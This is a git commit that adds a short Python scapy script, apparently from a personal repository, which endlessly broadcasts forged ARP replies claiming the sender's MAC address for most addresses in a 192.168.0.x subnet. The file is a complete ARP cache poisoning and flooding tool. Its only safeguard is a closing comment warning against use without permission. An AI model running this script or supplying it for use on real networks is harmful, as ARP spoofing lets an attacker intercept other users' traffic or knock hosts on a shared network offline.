e88081f5520f0b0d08795a8a868d42999fc4aebd
Muhammed Shafin P <hejhdiss@gmail.com>
2025-11-13 23:08:00 +0530

    Add files via upload

---
+++ scapy_flood_arp_reply.py
@@ -0,0 +1,14 @@
+# CopyRight @hejhdiss(Muhammed Shafin P)
+# Licensed under Apache 2.0.
+# thsi will be as reply to broadcAST BUT WILL UPDATE CACHES.
+
+from scapy.all import Ether,ARP,sendp,get_if_hwaddr
+import time
+iface='wlo1'
+while True:
+	for i in range (4,240):
+		ip_as=f"192.168.0.{i}"
+		print(f"{ip_as}:sending as this")
+		pkt=Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=2,hwsrc=get_if_hwaddr(iface),psrc=ip_as ,hwdst="ff:ff:ff:ff:ff:ff",pdst=ip_as)
+		sendp(pkt,iface=iface,verbose=True)
+# add or use time.sleep(x) ,x = time you want .this is a flooding.so dont use it without rights.
